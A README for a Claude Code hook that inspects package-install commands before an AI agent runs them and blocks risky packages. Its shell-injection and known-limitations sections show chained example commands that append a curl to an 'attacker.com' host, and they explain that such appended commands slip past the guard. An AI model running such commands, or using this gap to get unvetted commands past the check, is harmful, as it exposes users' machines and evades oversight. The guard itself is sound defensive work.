# Claude Code Integration

Slopcheck Agent provides native integration with [Claude Code](https://github.com/anthropics/claude-code) to intercept and analyze package installation commands (like `npm install` or `pnpm add`) before they are executed by the AI.

## Security Boundary

Claude Code handles the actual execution of the commands via its internal `Bash` tool. The Slopcheck integration hooks into the `PreToolUse` lifecycle event.
**It acts as a strict security gate:** 
1. It parses the command string to extract requested packages without executing the string.
2. It fetches the deterministic risk assessment.
3. It blocks execution (exit code 2) if the risk policy is violated.

## Installation

You must first have the Slopcheck Agent mono-repo installed locally.

```bash
npm install -g @slopcheck/claude-code
```
*(Currently available locally in the workspace)*

## Configuration

In your project's `.claude/settings.json` (or globally in `~/.claude/settings.json`), add a `hooks` block for the `PreToolUse` event:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "npx @slopcheck/claude-code"
          }
        ]
      }
    ]
  }
}
```

## Supported Commands

The integration automatically intercepts and parses:
- `npm install <package>` (and `npm i`)
- `pnpm add <package>` (and `pnpm install`)
- `yarn add <package>` (and `yarn install`)
- `bun install <package>` (and `bun add`)

It safely ignores non-install commands (like `git clone`, `npm test`, or `npm run build`), allowing them to proceed instantly.

## Security Model & Shell Injection

The command parser is strictly a lexer. It does **not** evaluate the string in a shell.
If Claude Code attempts to run a chained command like:
```bash
npm install react && curl http://attacker.com/malicious.sh
```
The Slopcheck lexer intercepts `react`, analyzes its safety, and allows or blocks the *entire* string based purely on the package's safety. It halts parsing at shell operators (`&&`, `;`, `|`, `$()`, etc.) to prevent tricking the security guard.

## Policy Behavior

The default `SlopcheckGuard` policy applies:
- **ALLOW**: Exits 0, Claude Code executes the installation.
- **WARN**: Outputs the warning to stdout and exits 0. Claude Code receives the warning context in the tool output but is allowed to proceed.
- **BLOCK**: Outputs structured risk breakdown to stderr and exits 2. Claude Code's `Bash` tool will receive an error and the installation command will NOT be executed.

## Known Limitations

- **Dry Run vs Execution**: Because Claude Code executes the full string after the hook exits 0, if an attacker uses `npm install safe-package && curl attacker.com`, the guard approves `safe-package` and allows execution, meaning `curl attacker.com` *will* be executed by Claude Code. This is an intentional design choice of Claude Code's hook mechanism; the guard only protects against the *packages* themselves being malicious, not the AI agent running arbitrary non-package commands. To restrict non-package commands, a separate Bash hook or strict Docker environment is required.
